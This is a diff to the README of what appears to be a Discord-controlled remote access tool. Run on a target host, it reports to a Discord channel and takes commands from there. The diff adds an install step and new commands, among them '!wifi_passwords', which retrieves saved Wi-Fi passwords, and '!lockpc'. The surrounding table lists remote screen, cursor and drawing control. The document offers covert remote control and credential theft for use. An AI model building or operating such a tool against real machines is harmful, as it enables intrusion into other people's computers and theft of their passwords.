@@ -11,6 +11,9 @@ I take no part in, nor do I endorse, any activities you choose to perform or add
 # Note
 There will not be any releases as when compiled, it will automatically use the inputted token; Not yours.
 
+IF THE JOINMIC COMMAND DOESNT WORK WHILE TESTING TRY RUNNING THIS IN CMD AND RECOMPILE :
+pip install "discord.py[voice] @ git+https://github.com/rapptz/discord.py"
+
 # Usage 
 
 This is a script that when run on the host, will send a connected message in the discord channel (change the ID and token within the script)
@@ -64,6 +67,10 @@ Command prefix is (!)
 |!setcursor [url/image]| Change cursor's image|Untested.
 |!draw [shape] [coordinates]| Draw shapes on the screen|!draw circle 500 500
 |!draw text [x,y][text]| Draw text on the screen|!draw text 1000 1000 hello
+|!rotate [degrees]| Rotate the screen by specified degrees|!rotate [0, 90, 180, 270]
+|!wallpaper [url/image]| Change desktop wallpaper|!wallpaper https://image.url
+|!wifi_passwords| Get saved Wi-Fi passwords|
+|!lockpc| Lock the Windows session immediately|
 
 # Step 1
 Change these IDs to your channel IDs.
